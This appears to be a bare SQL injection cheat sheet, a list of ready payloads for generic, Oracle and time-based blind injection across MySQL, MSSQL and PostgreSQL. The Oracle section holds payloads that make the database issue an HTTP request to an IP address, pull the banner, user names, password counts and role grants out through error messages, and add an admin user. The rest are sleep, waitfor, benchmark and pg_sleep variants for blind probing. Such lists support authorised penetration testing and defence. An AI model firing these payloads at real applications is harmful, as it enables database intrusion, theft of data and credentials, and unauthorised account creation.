# SQLI

```
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
```

## ORACLE

```
’ or ‘1’=’1
' or '1'='1
'||utl_http.request('http://192.168.1.1/')||'
' || myappadmin.adduser('admin', 'newpass') || '
' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i
' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i
```

## DELAY - SLEEP
```
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
";waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
");waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
1) or benchmark(10000000,MD5(1))#
") or benchmark(10000000,MD5(1))#
') or benchmark(10000000,MD5(1))#
1)) or benchmark(10000000,MD5(1))#
")) or benchmark(10000000,MD5(1))#
')) or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)='
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)='
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
'\"
AnD SLEEP(5)
AnD SLEEP(5)--

```